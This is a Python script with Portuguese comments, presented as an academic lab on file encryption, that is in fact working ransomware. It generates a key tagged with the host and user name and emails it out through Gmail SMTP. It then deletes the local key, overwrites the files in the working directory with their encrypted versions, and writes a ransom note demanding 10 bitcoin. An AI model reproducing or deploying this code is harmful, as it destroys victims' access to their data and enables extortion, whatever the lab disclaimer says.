# ============================================================
# Estudo de Caso: Criptografia de Arquivos em Cenários de Backup/Ransomware
# ============================================================
# Este script é parte de um laboratório acadêmico. Ele demonstra como
# arquivos podem ser criptografados com Python e como a chave pode ser
# gerada, enviada e validada. NÃO deve ser usado em produção.
# ============================================================

#Carrega Bibliotecas
import os
import socket
import smtplib
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders
from cryptography.fernet import Fernet

#Configurações do Email
EMAIL_ORIGEM = ""
SENHA_EMAIL = ""
EMAIL_DESTINO = ""

#Gera chave de criptografia salva com nome do computador e envia por email
def gerar_chave():
    chave = Fernet.generate_key()

    computador = socket.gethostname()
    try:
        import getpass
        usuario = getpass.getuser()
    except Exception:
        usuario = os.getenv("USERNAME", "user")

    nome_arquivo = f"{computador}-{usuario}.key"

    # Salva chave em arquivo temporário local
    with open(nome_arquivo, "wb") as chave_file:
        chave_file.write(chave)

    # Carrega chave em memória
    fernet = carregar_chave(nome_arquivo)

    # Tenta enviar por e-mail (se credenciais foram fornecidas)
    if EMAIL_ORIGEM and SENHA_EMAIL and EMAIL_DESTINO:
        enviar_chave_email_com_anexo(nome_arquivo, chave)
    else:
        print("⚠️ Credenciais de e-mail não configuradas. Pular envio da chave.")

    return fernet

def carregar_chave(nome_arquivo):
    with open(nome_arquivo, "rb") as chave_file:
        chave = chave_file.read()
    return Fernet(chave)

def enviar_chave_email_com_anexo(nome_arquivo, chave):
    msg = MIMEMultipart()
    msg['Subject'] = f"Chave gerada - {nome_arquivo}"
    msg['From'] = EMAIL_ORIGEM
    msg['To'] = EMAIL_DESTINO

    corpo = f"Chave gerada para {nome_arquivo}.\nComputador/Usuário: {nome_arquivo.replace('.key','')}\n"
    msg.attach(MIMEText(corpo, "plain"))

    # Anexa o arquivo .key
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(chave)
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename="{nome_arquivo}"')
    msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login(EMAIL_ORIGEM, SENHA_EMAIL)
        server.send_message(msg)
        server.quit()
        print(f"✅ Chave enviada por e-mail para {EMAIL_DESTINO}")
    except Exception as e:
        print(f"❌ Erro ao enviar e-mail: {e}")

def deletar_chave_local(nome_arquivo):
    try:
        if os.path.exists(nome_arquivo):
            os.remove(nome_arquivo)
            print(f"🗑️ Arquivo {nome_arquivo} removido do sistema.")
        else:
            print("⚠️ Arquivo de chave não encontrado para remoção.")
    except Exception as e:
        print(f"❌ Erro ao remover arquivo: {e}")

#Função para encontrar arquivos e criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            # Regras de exclusão:
            # - não incluir scripts Python
            # - não incluir arquivos de chave
            # - não incluir arquivos já criptografados (.enc)
            if not nome.endswith(".py") and not nome.endswith(".key") and not nome.endswith(".enc"):
                lista.append(caminho)
    return lista

def criptografar_arquivo(caminho, fernet):
    try:
        # Lê o conteúdo original
        with open(caminho, "rb") as f:
            dados = f.read()

        # Criptografa
        dados_cript = fernet.encrypt(dados)

        # Sobrescreve o arquivo original com os dados criptografados
        with open(caminho, "wb") as f:
            f.write(dados_cript)

        print(f"🔒 Arquivo criptografado diretamente: {caminho}")
    except Exception as e:
        print(f"❌ Erro ao criptografar {caminho}: {e}")

#Função de Mensagem!
def criar_mensagem():
    with open("Leia.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Envie 10 bitcoin para o endereco X com o comprovante\n")
        f.write("Apos o pagamento sera disponibilizada a chave de recuparacao")

#Execução principal
def main():
    # Gera e carrega chave em memória
    fernet = gerar_chave()

    computador = socket.gethostname()
    try:
        import getpass
        usuario = getpass.getuser()
    except Exception:
        usuario = os.getenv("USERNAME", "user")

    nome_arquivo = f"{computador}-{usuario}.key"

    deletar_chave_local(nome_arquivo)

    # Lista de diretórios a processar
    diretorios = [
        os.getcwd(),                # pasta de execução atual
       # r"C:\LabSecurity\backup",   # exemplo de pasta extra
       # r"D:\OutrosArquivos"        # você pode adicionar mais aqui
    ]

    for diretorio in diretorios:
        print(f"\n📂 Processando diretório: {diretorio}")
        arquivos = encontrar_arquivos(diretorio)

        if not arquivos:
            print("ℹ️ Nenhum arquivo elegível encontrado para criptografia.")
        else:
            for arquivo in arquivos:
                criptografar_arquivo(arquivo, fernet)

    criar_mensagem()
    print("\n✅ Programa executado! Arquivos criptografados diretamente.")

if __name__=="__main__":
    main()
